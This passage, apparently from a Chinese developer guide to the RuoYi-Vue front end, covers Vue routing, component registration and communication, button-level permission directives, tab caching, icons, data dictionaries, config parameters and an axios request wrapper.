      title<span class="token operator">:</span> <span class="token string">'测试管理'</span><span class="token punctuation">,</span>
      icon<span class="token operator">:</span> <span class="token string">'user'</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>外链示例</strong></p>
<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span>
  path<span class="token operator">:</span> <span class="token string">'http://ruoyi.vip'</span><span class="token punctuation">,</span>
  meta<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> title<span class="token operator">:</span> <span class="token string">'若依官网'</span><span class="token punctuation">,</span> icon <span class="token operator">:</span> <span class="token string">"guide"</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h3><a id="2_4238"></a>.2、静态路由</h3>
<p>代表那些不需要动态判断权限的路由，如登录页、404、等通用页面，在<a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/router/index.js">@/router/index.js (opens new window)</a>配置对应的公共路由。</p>
<h3><a id="3_4242"></a>.3、动态路由</h3>
<p>代表那些需要根据用户动态判断权限并通过<code>addRoutes</code>动态添加的页面，在<a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/store/modules/permission.js">@/store/modules/permission.js (opens new window)</a>加载后端接口路由配置。</p>
<p>提示</p>
<ul><li>动态路由可以在系统管理-菜单管理进行新增和修改操作，前端加载会自动请求接口获取菜单信息并转换成前端对应的路由。</li><li>动态路由在生产环境下会默认使用路由懒加载，实现方式参考<code>loadView</code>方法的判断。</li></ul>
<h3><a id="4_4251"></a>.4、常用方法</h3>
<p>想要跳转到不同的页面，使用<code>router.push</code>方法</p>
<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>跳转页面并设置请求参数，使用<code>query</code>属性</p>
<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span><span class="token punctuation">,</span> query<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>id<span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">"若依"</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>更多使用可以参考<a href="https://router.vuejs.org/zh">vue-router (opens new window)</a>官方文档。</p>
<h2><a id="6_4267"></a>6、组件使用</h2>
<p>vue 注册组件的两种方式</p>
<h3><a id="1_4271"></a>.1、局部注册</h3>
<p>在对应页使用<code>components</code>注册组件。</p>
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>count-to</span> <span class="token attr-name">:startVal</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>startVal<span class="token punctuation">'</span></span> <span class="token attr-name">:endVal</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>endVal<span class="token punctuation">'</span></span> <span class="token attr-name">:duration</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>3000<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>count-to</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> countTo <span class="token keyword">from</span> <span class="token string">'vue-count-to'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  components<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> countTo <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">data</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>
      startVal<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
      endVal<span class="token operator">:</span> <span class="token number">2020</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<h3><a id="2_4294"></a>.2、全局注册</h3>
<p>在 <a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/main.js">@/main.js (opens new window)</a>文件下注册组件。</p>
<pre><code class="prism language-js"><span class="token keyword">import</span> countTo <span class="token keyword">from</span> <span class="token string">'vue-count-to'</span>
Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'countTo'</span><span class="token punctuation">,</span> countTo<span class="token punctuation">)</span>
</code></pre>
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>count-to</span> <span class="token attr-name">:startVal</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>startVal<span class="token punctuation">'</span></span> <span class="token attr-name">:endVal</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>endVal<span class="token punctuation">'</span></span> <span class="token attr-name">:duration</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>3000<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>count-to</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<h3><a id="3_4309"></a>.3、创建使用</h3>
<p>可以通过创建一个后缀名为<code>vue</code>的文件，在通过<code>components</code>进行注册即可。</p>
<p><strong>例如定义一个<code>a.vue</code>文件</strong></p>
<pre><code class="prism language-vue">&lt;!-- 子组件 --&gt;
&lt;template&gt;
  &lt;div&gt;这是a组件&lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p><strong>在其他组件中导入并注册</strong></p>
<pre><code class="prism language-vue">&lt;!-- 父组件 --&gt;
&lt;template&gt;
  &lt;div style="text-align: center; font-size: 20px"&gt;
    测试页面
    &lt;testa&gt;&lt;/testa&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import a from "./a";
export default {
  components: { testa: a }
};
&lt;/script&gt;
</code></pre>
<h3><a id="4_4343"></a>.4、组件通信</h3>
<p><strong>通过<code>props</code>来接收外界传递到组件内部的值</strong></p>
<pre><code class="prism language-vue">&lt;!-- 父组件 --&gt;
&lt;template&gt;
  &lt;div style="text-align: center; font-size: 20px"&gt;
    测试页面
    &lt;testa :name="name"&gt;&lt;/testa&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import a from "./a";
export default {
  components: { testa: a },
  data() {
    return {
      name: "若依"
    };
  },
};
&lt;/script&gt;

&lt;!-- 子组件 --&gt;
&lt;template&gt;
  &lt;div&gt;这是a组件 name:{<!-- -->{ name }}&lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  props: {
    name: {
      type: String,
      default: ""
    },
  }
};
&lt;/script&gt;
</code></pre>
<p><strong>使用<code>$emit</code>监听子组件触发的事件</strong></p>
<pre><code class="prism language-vue">&lt;!-- 父组件 --&gt;
&lt;template&gt;
  &lt;div style="text-align: center; font-size: 20px"&gt;
    测试页面
    &lt;testa :name="name" @ok="ok"&gt;&lt;/testa&gt;
    子组件传来的值 : {<!-- -->{ message }}
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import a from "./a";
export default {
  components: { testa: a },
  data() {
    return {
      name: "若依",
      message: ""
    };
  },
  methods: {
    ok(message) {
      this.message = message;
    },
  },
};
&lt;/script&gt;

&lt;!-- 子组件 --&gt;
&lt;template&gt;
  &lt;div&gt;
    这是a组件 name:{<!-- -->{ name }}
    &lt;button @click="click"&gt;发送&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  props: {
    name: {
      type: String,
      default: ""
    },
  },
  data() {
    return {
      message: "我是来自子组件的消息"
    };
  },
  methods: {
    click() {
      this.$emit("ok", this.message);
    },
  },
};
&lt;/script&gt;
</code></pre>
<h2><a id="7_4447"></a>7、权限使用</h2>
<p>封装了一个指令权限，能简单快速的实现按钮级别的权限判断。<a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/directive/permission">v-permission(opens new window)</a></p>
<p><strong>使用权限字符串 v-hasPermi</strong></p>
<pre><code class="prism language-html">// 单个
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span> <span class="token attr-name">v-hasPermi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[<span class="token punctuation">'</span>system:user:add<span class="token punctuation">'</span>]<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>存在权限字符串才能看到<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
// 多个
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span> <span class="token attr-name">v-hasPermi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[<span class="token punctuation">'</span>system:user:add<span class="token punctuation">'</span>, <span class="token punctuation">'</span>system:user:edit<span class="token punctuation">'</span>]<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>包含权限字符串才能看到<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p><strong>使用角色字符串 v-hasRole</strong></p>
<pre><code class="prism language-html">// 单个
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span> <span class="token attr-name">v-hasRole</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[<span class="token punctuation">'</span>admin<span class="token punctuation">'</span>]<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>管理员才能看到<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
// 多个
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span> <span class="token attr-name">v-hasRole</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[<span class="token punctuation">'</span>role1<span class="token punctuation">'</span>, <span class="token punctuation">'</span>role2<span class="token punctuation">'</span>]<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>包含角色才能看到<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>提示</p>
<p>在某些情况下，它是不适合使用v-hasPermi，如元素标签组件，只能通过手动设置v-if。 可以使用全局权限判断函数，用法和指令 v-hasPermi 类似。</p>
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-tabs</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-tab-pane</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkPermi([<span class="token punctuation">'</span>system:user:add<span class="token punctuation">'</span>])<span class="token punctuation">"</span></span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>用户管理<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>用户管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-tab-pane</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-tab-pane</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkPermi([<span class="token punctuation">'</span>system:user:add<span class="token punctuation">'</span>, <span class="token punctuation">'</span>system:user:edit<span class="token punctuation">'</span>])<span class="token punctuation">"</span></span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>参数管理<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>menu<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>参数管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-tab-pane</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-tab-pane</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkRole([<span class="token punctuation">'</span>admin<span class="token punctuation">'</span>])<span class="token punctuation">"</span></span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>角色管理<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>role<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>角色管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-tab-pane</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-tab-pane</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkRole([<span class="token punctuation">'</span>admin<span class="token punctuation">'</span>,<span class="token punctuation">'</span>common<span class="token punctuation">'</span>])<span class="token punctuation">"</span></span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>定时任务<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>job<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>定时任务<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-tab-pane</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-tabs</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> checkPermi<span class="token punctuation">,</span> checkRole <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/utils/permission"</span><span class="token punctuation">;</span> <span class="token comment">// 权限判断函数</span>

<span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">{<!-- --></span>
   methods<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    checkPermi<span class="token punctuation">,</span>
    checkRole
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>前端有了鉴权后端还需要鉴权吗？</p>
<p>前端的鉴权只是一个辅助功能，对于专业人员这些限制都是可以轻松绕过的，为保证服务器安全，无论前端是否进行了权限校验，后端接口都需要对会话请求再次进行权限校验！</p>
<h2><a id="8_4499"></a>8、多级目录</h2>
<p>如果你的路由是多级目录，有三级路由嵌套的情况下，还需要手动在二级目录的根文件下添加一个 <code>&lt;router-view&gt;</code>。</p>
<p>如：<a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/views/system/log/index.vue">@/views/system/log/index.vue (opens new window)</a>，原则上有多少级路由嵌套就需要多少个<code>&lt;router-view&gt;</code>。</p>
<p><img alt="img" src="https://img-blog.csdnimg.cn/img_convert/2cdf8270ecc2b060f0e795d38b3edd18.png"/></p>
<p>提示</p>
<p>最新版本多级目录已经支持自动配置组件，无需添加<code>&lt;router-view&gt;</code>。</p>
<h2><a id="9_4513"></a>9、页签缓存</h2>
<p>由于目前 <code>keep-alive</code> 和 <code>router-view</code> 是强耦合的，而且查看文档和源码不难发现 <code>keep-alive</code> 的 <a href="https://cn.vuejs.org/v2/api/#keep-alive">include (opens new window)</a>默认是优先匹配组件的 <strong>name</strong> ，所以在编写路由 router 和路由对应的 view component 的时候一定要确保 两者的 name 是完全一致的。(切记 name 命名时候尽量保证唯一性 切记不要和某些组件的命名重复了，不然会递归引用最后内存溢出等问题)</p>
<p><strong>DEMO:</strong></p>
<pre><code class="prism language-js"><span class="token comment">//router 路由声明</span>
<span class="token punctuation">{<!-- --></span>
  path<span class="token operator">:</span> <span class="token string">'config'</span><span class="token punctuation">,</span>
  <span class="token function-variable function">component</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'@/views/system/config/index'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  name<span class="token operator">:</span> <span class="token string">'Config'</span><span class="token punctuation">,</span>
  meta<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> title<span class="token operator">:</span> <span class="token string">'参数设置'</span><span class="token punctuation">,</span> icon<span class="token operator">:</span> <span class="token string">'edit'</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<pre><code class="prism language-js"><span class="token comment">//路由对应的view  system/config/index</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  name<span class="token operator">:</span> <span class="token string">'Config'</span>
<span class="token punctuation">}</span>
</code></pre>
<p>一定要保证两者的名字相同，切记写重或者写错。默认如果不写 name 就不会被缓存，详情见<a href="https://github.com/vuejs/vue/issues/6938#issuecomment-345728620">issue (opens new window)</a>。</p>
<p>提示</p>
<p>在系统管理-菜单管理-可以配置菜单页签是否缓存，默认为缓存</p>
<h2><a id="10_4546"></a>10、使用图标</h2>
<p>全局 Svg Icon 图标组件。</p>
<p>默认在 <a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/assets/icons/index.js">@/icons/index.js (opens new window)</a>中注册到全局中，可以在项目中任意地方使用。所以图标均可在 <a href="https://gitee.com/y_project/RuoYi-Vue/tree/master/ruoyi-ui/src/assets/icons/svg">@/icons/svg (opens new window)</a>。可自行添加或者删除图标，所以图标都会被自动导入，无需手动操作。</p>
<h3><a id="1_4552"></a>.1、使用方式</h3>
<pre><code class="prism language-html"><span class="token comment">&lt;!-- icon-class 为 icon 的名字; class-name 为 icon 自定义 class--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg-icon</span> <span class="token attr-name">icon-class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span>  <span class="token attr-name">class-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>custom-class<span class="token punctuation">'</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre>
<h3><a id="2_4559"></a>.2、改变颜色</h3>
<pre><code>svg-icon` 默认会读取其父级的 color `fill: currentColor;
</code></pre>
<p>你可以改变父级的<code>color</code>或者直接改变<code>fill</code>的颜色即可。</p>
<p>提示</p>
<p>如果你是从 <a href="https://www.iconfont.cn/">iconfont (opens new window)</a>下载的图标，记得使用如 Sketch 等工具规范一下图标的大小问题，不然可能会造成项目中的图标大小尺寸不统一的问题。 本项目中使用的图标都是 128*128 大小规格的。</p>
<h2><a id="11_4571"></a>11、使用字典</h2>
<p>字典管理是用来维护数据类型的数据，如下拉框、单选按钮、复选框、树选择的数据，方便系统管理员维护。主要功能包括：字典分类管理、字典数据管理</p>
<p><strong>大于<code>3.7.0</code>版本使用如下方法</strong></p>
<p>1、main.js中引入全局变量和方法（已有）</p>
<pre><code class="prism language-js"><span class="token keyword">import</span> DictData <span class="token keyword">from</span> <span class="token string">'@/components/DictData'</span>
DictData<span class="token punctuation">.</span><span class="token function">install</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>2、加载数据字典，可以是多个。</p>
<pre><code class="prism language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  dicts<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'字典类型'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token operator">...</span>
<span class="token operator">...</span>
</code></pre>
<p>3、读取数据字典</p>
<pre><code class="prism language-js"><span class="token operator">&lt;</span>el<span class="token operator">-</span>option
  v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"dict in dict.type.字典类型"</span>
  <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"dict.value"</span>
  <span class="token operator">:</span>label<span class="token operator">=</span><span class="token string">"dict.label"</span>
  <span class="token operator">:</span>value<span class="token operator">=</span><span class="token string">"dict.value"</span>
<span class="token operator">/</span><span class="token operator">&gt;</span>
</code></pre>
<p>4、翻译数据字典</p>
<pre><code class="prism language-vue">// 字典标签组件翻译
&lt;el-table-column label="名称" align="center" prop="name"&gt;
  &lt;template slot-scope="scope"&gt;
    &lt;dict-tag :options="dict.type.字典类型" :value="scope.row.name"/&gt;
  &lt;/template&gt;
&lt;/el-table-column&gt;

// 自定义方法翻译
{<!-- -->{ xxxxFormat(form) }}

xxxxFormat(row, column) {
  return this.selectDictLabel(this.dict.type.字典类型, row.name);
},
</code></pre>
<p><strong>小于<code>3.7.0</code>版本使用如下方法</strong></p>
<p>1、main.js中引入全局变量和方法（已有）</p>
<pre><code class="prism language-js"><span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> getDicts <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/api/system/dict/data"</span><span class="token punctuation">;</span>
<span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getDicts <span class="token operator">=</span> getDicts
</code></pre>
<p>2、加载数据字典</p>
<pre><code class="prism language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>
      xxxxxOptions<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">...</span>

<span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDicts</span><span class="token punctuation">(</span><span class="token string">"字典类型"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>xxxxxOptions <span class="token operator">=</span> response<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre>
<p>3、读取数据字典</p>
<pre><code class="prism language-js"><span class="token operator">&lt;</span>el<span class="token operator">-</span>option
  v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"dict in xxxxxOptions"</span>
  <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"dict.dictValue"</span>
  <span class="token operator">:</span>label<span class="token operator">=</span><span class="token string">"dict.dictLabel"</span>
  <span class="token operator">:</span>value<span class="token operator">=</span><span class="token string">"dict.dictValue"</span>
<span class="token operator">/</span><span class="token operator">&gt;</span>
</code></pre>
<p>4、翻译数据字典</p>
<pre><code class="prism language-vue">// 字典标签组件翻译
&lt;el-table-column label="名称" align="center" prop="name"&gt;
  &lt;template slot-scope="scope"&gt;
    &lt;dict-tag :options="xxxxxOptions" :value="scope.row.name"/&gt;
  &lt;/template&gt;
&lt;/el-table-column&gt;

// 自定义方法翻译
{<!-- -->{ xxxxFormat(form) }}

xxxxFormat(row, column) {
  return this.selectDictLabel(this.xxxxxOptions, row.name);
},
</code></pre>
<h2><a id="12_4679"></a>12、使用参数</h2>
<p>参数设置是提供开发人员、实施人员的动态系统配置参数，不需要去频繁修改后台配置文件，也无需重启服务器即可生效。</p>
<p>1、main.js中引入全局变量和方法（已有）</p>
<pre><code class="prism language-js"><span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> getConfigKey <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/api/system/config"</span><span class="token punctuation">;</span>
<span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getConfigKey <span class="token operator">=</span> getConfigKey
</code></pre>
<p>2、页面使用参数</p>
<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConfigKey</span><span class="token punctuation">(</span><span class="token string">"参数键名"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>xxxxx <span class="token operator">=</span> response<span class="token punctuation">.</span>msg<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2><a id="13_4698"></a>13、异常处理</h2>
<p><code>@/utils/request.js</code> 是基于 <code>axios</code> 的封装，便于统一处理 POST，GET 等请求参数，请求头，以及错误提示信息等。它封装了全局 <code>request拦截器</code>、<code>response拦截器</code>、<code>统一的错误处理</code>、<code>统一做了超时处理</code>、<code>baseURL设置等</code>。 如果有自定义错误码可以在<code>errorCode.js</code>中设置对应<code>key</code> <code>value</code>值。</p>
<pre><code class="prism language-js"><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> Notification<span class="token punctuation">,</span> MessageBox<span class="token punctuation">,</span> Message <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'element-ui'</span>
<span class="token keyword">import</span> store <span class="token keyword">from</span> <span class="token string">'@/store'</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> getToken <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/utils/auth'</span>
<span class="token keyword">import</span> errorCode <span class="token keyword">from</span> <span class="token string">'@/utils/errorCode'</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> tansParams <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/utils/ruoyi"</span><span class="token punctuation">;</span>

axios<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/json;charset=utf-8'</span>
<span class="token comment">// 创建axios实例</span>
<span class="token keyword">const</span> service <span class="token operator">=</span> axios<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
  <span class="token comment">// axios中请求配置有baseURL选项，表示请求URL公共部分</span>
  baseURL<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">VUE_APP_BASE_API</span><span class="token punctuation">,</span>
  <span class="token comment">// 超时</span>
  timeout<span class="token operator">:</span> <span class="token number">10000</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// request拦截器</span>
service<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token parameter">config</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 是否需要设置 token</span>
  <span class="token keyword">const</span> isToken <span class="token operator">=</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>headers <span class="token operator">||</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isToken <span class="token operator">===</span> <span class="token boolean">false</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isToken<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
